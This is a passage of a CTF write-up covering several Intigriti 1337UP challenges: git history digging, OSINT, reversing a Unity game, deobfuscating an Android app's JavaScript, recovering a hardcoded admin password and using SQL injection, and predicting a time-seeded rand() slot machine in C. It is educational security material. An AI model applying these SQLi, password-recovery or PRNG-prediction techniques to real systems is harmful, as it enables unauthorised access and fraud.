+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ git pull origin main
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 3, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Compressing objects: 100% <span class="o">(</span>2/2<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">3</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">0</span> <span class="o">(</span>from 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unpacking objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="m">934</span> bytes <span class="p">|</span> 467.00 KiB/s, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">From github.com:bob-193/1337up
+</span></span><span class="line"><span class="cl"> * branch            main       -&gt; FETCH_HEAD
+</span></span><span class="line"><span class="cl"> * <span class="o">[</span>new branch<span class="o">]</span>      main       -&gt; origin/main
+</span></span></code></pre></div><p>The repo had this file :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat readme.md
+</span></span><span class="line"><span class="cl">Hey, Tiffany! You will need to save this repo in your user space and implement changes we agreed earlier.
+</span></span></code></pre></div><p>Lots of useful keywords, we&rsquo;ll have to clone 1337up.git then :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ git clone git@github.com:nitrofany/1337up.git
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;1337up&#39;</span>...
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 13, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Counting objects: 100% <span class="o">(</span>13/13<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Compressing objects: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">13</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">0</span> <span class="o">(</span>from 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>13/13<span class="o">)</span>, <span class="k">done</span>.
+</span></span></code></pre></div><p>But we&rsquo;re not done yet, there&rsquo;s nothing in this repo :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat config/.env
+</span></span><span class="line"><span class="cl"><span class="nv">flag</span><span class="o">=</span>replace with production INTIGRITI<span class="o">{</span>...<span class="o">}</span>
+</span></span></code></pre></div><p>except the keyword production, let&rsquo;s check the logs :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ git log --oneline
+</span></span><span class="line"><span class="cl">0f2ad04 <span class="o">(</span>HEAD -&gt; main, origin/main, origin/HEAD<span class="o">)</span> update
+</span></span><span class="line"><span class="cl">5c18888 update
+</span></span><span class="line"><span class="cl">d127325 update
+</span></span><span class="line"><span class="cl">5f73d37 init                       
+</span></span><span class="line"><span class="cl">$ git show 5c18888
+</span></span><span class="line"><span class="cl">commit 5c18888418fd3f2a9d76cfd278b69c1f7c41ba4f
+</span></span><span class="line"><span class="cl">Author: root &lt;root@vmi1519856.contaboserver.net&gt;
+</span></span><span class="line"><span class="cl">Date:   Mon Aug <span class="m">19</span> 14:15:57 <span class="m">2024</span> +0200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">diff --git a/.gitmodules b/.gitmodules
+</span></span><span class="line"><span class="cl">new file mode <span class="m">100644</span>
+</span></span><span class="line"><span class="cl">index 0000000..0f2b51c
+</span></span><span class="line"><span class="cl">--- /dev/null
+</span></span><span class="line"><span class="cl">+++ b/.gitmodules
+</span></span><span class="line"><span class="cl">@@ -0,0 +1,3 @@
+</span></span><span class="line"><span class="cl">+<span class="o">[</span>submodule <span class="s2">&#34;config&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">+       <span class="nv">path</span> <span class="o">=</span> config
+</span></span><span class="line"><span class="cl">+       <span class="nv">url</span> <span class="o">=</span> https://github.com/nitrofany/01189998819991197253
+</span></span><span class="line"><span class="cl">diff --git a/flag.txt b/flag.txt
+</span></span><span class="line"><span class="cl">deleted file mode <span class="m">100644</span>
+</span></span><span class="line"><span class="cl">index e69de29..0000000
+</span></span><span class="line"><span class="cl">$ git clone git@github.com:nitrofany/01189998819991197253
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;01189998819991197253&#39;</span>...
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 3, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">3</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">0</span> <span class="o">(</span>from 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span>.
+</span></span></code></pre></div><p>in this repo you can file the flag !</p>
+<h2 id="socials---osint">Socials - Osint</h2>
+<h3 id="description-9">Description</h3>
+<p>Have a look around our socials, maybe you&rsquo;ll find some flags! Don&rsquo;t forget to hit follow while you&rsquo;re there 🥺</p>
+<p>Flag format: INTIGRITI{Twitter+YouTube+Reddit}</p>
+<h3 id="explanation-9">Explanation</h3>
+<p>Simple OSINT challenge, I just had to check the comments for twitter, youtube and reddit.</p>
+<h2 id="bug-squash-part-1---rev">Bug Squash (Part 1) - Rev</h2>
+<h3 id="description-10">Description</h3>
+<p>Squash those bugs!</p>
+<h3 id="explanation-10">Explanation</h3>
+<p>Use the powerful tool that is AssetRipper, I&rsquo;ve added all the files, then exported the project, then ran strings and searched for anything that mentions win.enc, why ? Because in &ldquo;StreamingAssets&rdquo; there&rsquo;s a folder called MeshText containing this file, my instincts said that&rsquo;s the flag.</p>
+<p>In GameManager.cs there&rsquo;s this function :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C#" data-lang="C#"><span class="line"><span class="cl"><span class="kd">private</span> <span class="k">void</span> <span class="n">CheckWinCondition</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="p">!=</span> <span class="p">-</span><span class="m">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">iv</span> <span class="p">=</span> <span class="n">SetIV</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">LoadKeyfile</span><span class="p">(</span><span class="n">winfilePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">array</span> <span class="p">!=</span> <span class="kc">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="n">DecryptImageFromFile</span><span class="p">(</span><span class="n">winImagePath</span><span class="p">,</span> <span class="n">array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">array2</span> <span class="p">!=</span> <span class="kc">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">DisplayWinImage</span><span class="p">(</span><span class="n">array2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">else</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">Debug</span><span class="p">.</span><span class="n">LogError</span><span class="p">(</span><span class="s">&#34;Failed to decrypt the image.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">Debug</span><span class="p">.</span><span class="n">LogError</span><span class="p">(</span><span class="s">&#34;Failed to load the keyfile.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>Round 2 : Cheat Engine. We&rsquo;ll simply look for the score value, change it to -1338, catch a bug (+1), and voila :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7bCD566D71-F20C-4E7B-9325-32832D3E519F%7d.png"
+        data-srcset="%7bCD566D71-F20C-4E7B-9325-32832D3E519F%7d.png, %7bCD566D71-F20C-4E7B-9325-32832D3E519F%7d.png 1.5x, %7bCD566D71-F20C-4E7B-9325-32832D3E519F%7d.png 2x"
+        data-sizes="auto"
+        alt="{CD566D71-F20C-4E7B-9325-32832D3E519F}.png"
+        title="alt text" /></p>
+<h2 id="cold-storage---rev">Cold Storage - Rev</h2>
+<h3 id="description-11">Description</h3>
+<p>People say you should store your keys offline in cold storage, so I built this offline app! I think that&rsquo;s what cold storage means 🤔</p>
+<h3 id="explanation-11">Explanation</h3>
+<p>I started by using Jadx to get the source code, then I found an obfuscated javascript code, then deobfuscated it :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">affineEncrypt</span><span class="p">(</span><span class="nx">_0x1930bc</span><span class="p">,</span> <span class="nx">_0x36e79b</span><span class="p">,</span> <span class="nx">_0x33477e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="nx">_0x36e79b</span> <span class="o">*</span> <span class="nx">_0x1930bc</span> <span class="o">+</span> <span class="nx">_0x33477e</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">xor</span><span class="p">(</span><span class="nx">_0x3a38fa</span><span class="p">,</span> <span class="nx">_0x3c3309</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">_0x3a38fa</span> <span class="o">^</span> <span class="nx">_0x3c3309</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hexToBytes</span><span class="p">(</span><span class="nx">_0x1d9eb0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">_0x2ac99a</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">_0x2363dc</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="nx">_0x2363dc</span> <span class="o">&lt;</span> <span class="nx">_0x1d9eb0</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">_0x2363dc</span> <span class="o">+=</span> <span class="mh">0x2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">_0x2ac99a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x1d9eb0</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">_0x2363dc</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">),</span> <span class="mh">0x10</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">_0x2ac99a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">reverseString</span><span class="p">(</span><span class="nx">_0x22dcba</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">_0x22dcba</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">keygen</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">_0x19eb60</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5&#34;</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">),</span> <span class="s2">&#34;9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5&#34;</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">),</span> <span class="s2">&#34;9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5&#34;</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">),</span> <span class="s2">&#34;9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5&#34;</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">),</span> <span class="s2">&#34;9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5&#34;</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">),</span> <span class="s2">&#34;9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5&#34;</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">_0x4c2f5e</span> <span class="o">=</span> <span class="p">[</span><span class="nx">_0x19eb60</span><span class="p">[</span><span class="mh">0x3</span><span class="p">],</span> <span class="nx">_0x19eb60</span><span class="p">[</span><span class="mh">0x5</span><span class="p">],</span> <span class="nx">_0x19eb60</span><span class="p">[</span><span class="mh">0x1</span><span class="p">],</span> <span class="nx">_0x19eb60</span><span class="p">[</span><span class="mh">0x4</span><span class="p">],</span> <span class="nx">_0x19eb60</span><span class="p">[</span><span class="mh">0x2</span><span class="p">],</span> <span class="nx">_0x19eb60</span><span class="p">[</span><span class="mh">0x0</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">_0x22e526</span> <span class="o">=</span> <span class="nx">_0x4c2f5e</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">_0x2051e9</span> <span class="o">=</span> <span class="nx">hexToBytes</span><span class="p">(</span><span class="nx">_0x22e526</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">_0x351569</span> <span class="o">=</span> <span class="nx">_0x2051e9</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">_0x585a6f</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="mh">0x9</span> <span class="o">*</span> <span class="nx">_0x585a6f</span> <span class="o">+</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span> <span class="o">^</span> <span class="mh">0x33</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">_0x351569</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">_0x5ca89b</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="nx">_0x5ca89b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)).</span><span class="nx">slice</span><span class="p">(</span><span class="o">-</span><span class="mh">0x2</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>So I console.logged _0x2051e9 because after that line some xor and math happens and I got the flag !</p>
+<h2 id="phish-market-order-management---rev">Phish Market Order Management - Rev</h2>
+<h3 id="description-12">Description</h3>
+<p>Welcome to the Phish Market Order Management System! This system will allow you to view important information about the Phish Market&rsquo;s products and customers.</p>
+<h3 id="explanation-12">Explanation</h3>
+<p>First step was to gain the admin password :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b4D34A957-D953-4486-8D25-5E6B98F3E03F%7d.png"
+        data-srcset="%7b4D34A957-D953-4486-8D25-5E6B98F3E03F%7d.png, %7b4D34A957-D953-4486-8D25-5E6B98F3E03F%7d.png 1.5x, %7b4D34A957-D953-4486-8D25-5E6B98F3E03F%7d.png 2x"
+        data-sizes="auto"
+        alt="{4D34A957-D953-4486-8D25-5E6B98F3E03F}.png"
+        title="alt text" /></p>
+<p>the condition checks if sub_40359c returns false :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b908D4712-B1BD-4355-82F6-3514E28307DC%7d.png"
+        data-srcset="%7b908D4712-B1BD-4355-82F6-3514E28307DC%7d.png, %7b908D4712-B1BD-4355-82F6-3514E28307DC%7d.png 1.5x, %7b908D4712-B1BD-4355-82F6-3514E28307DC%7d.png 2x"
+        data-sizes="auto"
+        alt="{908D4712-B1BD-4355-82F6-3514E28307DC}.png"
+        title="alt text" /></p>
+<p>and this function calls sub_4034c9 :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b7C9544D8-2BC1-41EA-9E85-53B09D18D759%7d.png"
+        data-srcset="%7b7C9544D8-2BC1-41EA-9E85-53B09D18D759%7d.png, %7b7C9544D8-2BC1-41EA-9E85-53B09D18D759%7d.png 1.5x, %7b7C9544D8-2BC1-41EA-9E85-53B09D18D759%7d.png 2x"
+        data-sizes="auto"
+        alt="{7C9544D8-2BC1-41EA-9E85-53B09D18D759}.png"
+        title="alt text" /></p>
+<p>which I assumed encrypts the string INTRIGITI1337UP# with a xor key, however I was missing the key&hellip;</p>
+<p>Good thing is retdec exposes the key :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b217F2C55-5208-450F-B108-297B31F4CAF7%7d.png"
+        data-srcset="%7b217F2C55-5208-450F-B108-297B31F4CAF7%7d.png, %7b217F2C55-5208-450F-B108-297B31F4CAF7%7d.png 1.5x, %7b217F2C55-5208-450F-B108-297B31F4CAF7%7d.png 2x"
+        data-sizes="auto"
+        alt="{217F2C55-5208-450F-B108-297B31F4CAF7}.png"
+        title="alt text" /></p>
+<p>the password was &ldquo;N3v3RG0nn@6u3$$!&rdquo;</p>
+<p>I couldn&rsquo;t simply cat the flag because my input was part of a sql query, except this query was vulnerable to SQLi :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b892C9212-D4DB-4E6F-83E5-A369476108C2%7d.png"
+        data-srcset="%7b892C9212-D4DB-4E6F-83E5-A369476108C2%7d.png, %7b892C9212-D4DB-4E6F-83E5-A369476108C2%7d.png 1.5x, %7b892C9212-D4DB-4E6F-83E5-A369476108C2%7d.png 2x"
+        data-sizes="auto"
+        alt="{892C9212-D4DB-4E6F-83E5-A369476108C2}.png"
+        title="alt text" /></p>
+<p>it should be like this :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b98965223-D944-419C-ADC9-A2FBA97A75F4%7d.png"
+        data-srcset="%7b98965223-D944-419C-ADC9-A2FBA97A75F4%7d.png, %7b98965223-D944-419C-ADC9-A2FBA97A75F4%7d.png 1.5x, %7b98965223-D944-419C-ADC9-A2FBA97A75F4%7d.png 2x"
+        data-sizes="auto"
+        alt="{98965223-D944-419C-ADC9-A2FBA97A75F4}.png"
+        title="alt text" /></p>
+<p>With a quote added to the end, so I ran a union select query BUT the results were being converted to decimal, so what I did was to take just 1 character off the flag, convert it to decimal, then display it :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="%7b3D3F4305-AACD-4F7C-BAF0-CAC79EE201A0%7d.png"
+        data-srcset="%7b3D3F4305-AACD-4F7C-BAF0-CAC79EE201A0%7d.png, %7b3D3F4305-AACD-4F7C-BAF0-CAC79EE201A0%7d.png 1.5x, %7b3D3F4305-AACD-4F7C-BAF0-CAC79EE201A0%7d.png 2x"
+        data-sizes="auto"
+        alt="{3D3F4305-AACD-4F7C-BAF0-CAC79EE201A0}.png"
+        title="alt text" /></p>
+<h2 id="rigged-slot-machine-1---rev">Rigged Slot Machine 1 - Rev</h2>
+<h3 id="description-13">Description</h3>
+<p>The casino thinks they&rsquo;ve rigged their slots so well, they can give every player $100 free play! Of course, there&rsquo;s always some small print: you can&rsquo;t cash out unless you hit the jackpot and each player only gets 3 minutes play time</p>
+<h3 id="explanation-13">Explanation</h3>
+<p>If we reverse the binary we&rsquo;ll find that we&rsquo;ll have to reach a balance of 133742 dollars&hellip;Good thing is the outcome is determined by rand() which uses the current time as a seed.</p>
+<p>I made a quick program in c that generates a hashmap of 10k elements, 1 for win and 0 for loss :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Define the size of the &#34;hashmap&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define NUM_RANDOMS 100000
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Array to store pre-generated random numbers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">random_numbers</span><span class="p">[</span><span class="n">NUM_RANDOMS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Array to store outcome map
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">outcome_map</span><span class="p">[</span><span class="n">NUM_RANDOMS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Function to analyze the outcome based on random value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">analyze_outcome</span><span class="p">(</span><span class="kt">int</span> <span class="n">rand_val</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">rand_val</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Win
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rand_val</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Win
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rand_val</span> <span class="o">&lt;</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Win
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rand_val</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Win
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rand_val</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Break-even counts as Win
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Loss
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">outcome_map</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Seed random number generator
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">srand</span><span class="p">(</span><span class="nf">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Generate and store random numbers in the array
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_RANDOMS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">analyze_outcome</span><span class="p">(</span><span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Could&rsquo;ve improved the code but whatever&hellip;</p>
